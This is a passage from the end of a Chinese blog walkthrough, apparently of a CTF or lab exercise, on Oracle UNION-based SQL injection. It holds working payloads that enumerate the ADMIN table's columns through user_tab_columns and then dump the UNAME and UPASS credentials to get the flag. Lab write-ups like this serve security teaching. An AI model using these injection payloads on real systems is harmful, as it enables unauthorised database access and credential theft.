+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(<span class="built_in">column_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’  </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt; ‘UNAME’ <span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt; ‘UPASS’</span><br></pre></td></tr></table></figure>
+
+<p>没有找到对应的数据<br><img src="https://img-blog.csdnimg.cn/20210410180850196.png" alt="在这里插入图片描述"></p>
+<p>得出admin表中有2个字段，uname 和 upass<br>12、得到字段中的数据</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> uname,upass <span class="keyword">from</span> <span class="keyword">admin</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(UNAME),to_nchar(UPASS),<span class="keyword">null</span> <span class="keyword">from</span> <span class="keyword">ADMIN</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410180920338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>13、得到flag，通关</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/11/23/SQL%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/" rel="prev" title="SQL注入-反弹注入">
+                  <i class="fa fa-chevron-left"></i> SQL注入-反弹注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/11/26/SQL%E6%B3%A8%E5%85%A5-Bypass/" rel="next" title="SQL注入-Bypass">
+                  SQL注入-Bypass <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kiligwh</span>
+</div>
+
+<!-- 删除 “由 Hexo & NexT.Gemini 强力驱动” -->
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+<!-- <br /> -->
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<!-- <span id="times">载入时分秒...</span> -->
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+  
+  
+  <script type="text/javascript"
+	count="150"
+	opacity: 1
+	src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+  </script>
+  
+
+</body>
+</html>
